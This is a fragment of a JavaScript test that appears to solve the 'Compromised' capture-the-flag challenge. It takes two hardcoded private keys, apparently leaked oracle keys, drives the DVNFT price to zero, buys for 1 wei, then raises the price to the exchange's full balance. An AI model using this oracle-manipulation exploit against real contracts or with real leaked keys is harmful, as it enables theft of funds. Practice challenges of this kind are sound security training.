...
describe('Compromised challenge', function () {
  ...
  it('Execution', async function () {
    ...
    const comp1 = new Wallet('0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9', deployer.provider);
    const comp2 = new Wallet('0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48', deployer.provider);

    await oracle.connect(comp1).postPrice('DVNFT', 0);
    await oracle.connect(comp2).postPrice('DVNFT', 0);

    await exchange.connect(player).buyOne({ value: parseUnits('1', 'wei') });

    await oracle.connect(comp1).postPrice('DVNFT', EXCHANGE_INITIAL_ETH_BALANCE);
    await oracle.connect(comp2).postPrice('DVNFT', EXCHANGE_INITIAL_ETH_BALANCE);
